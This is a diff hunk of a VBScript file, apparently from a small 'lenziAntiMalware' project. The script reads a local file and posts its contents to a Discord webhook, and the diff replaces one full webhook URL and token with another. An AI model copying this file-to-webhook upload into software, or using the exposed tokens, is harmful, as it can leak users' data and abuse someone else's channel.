@@ -26,7 +26,7 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 Set file = fso.OpenTextFile("C:\lenziAntiMalware\2023\lenziINC\updates.lse")
 tu = file.ReadAll
 Message = tu
-WebhookURL = "https://discord.com/api/webhooks/1080800523294351360/8hHl980mAmYgCB4TUyaLG-KrYlOct2WjY2ixkSQUAJoIbUqjRCRIMoP0wHVWkGlT5osr"
+WebhookURL = "https://discord.com/api/webhooks/1080812547726381066/Is69P-YZHUWSwkd2jTJGf3KuWeOcaM07lZz5_xR49SxKZEKL6RdhD2j7_YJn06Y6Rdjj"
     ' oh no not an intentionally public webhook u found it!!1!
 
 Set HttpReq = CreateObject("MSXML2.XMLHTTP")
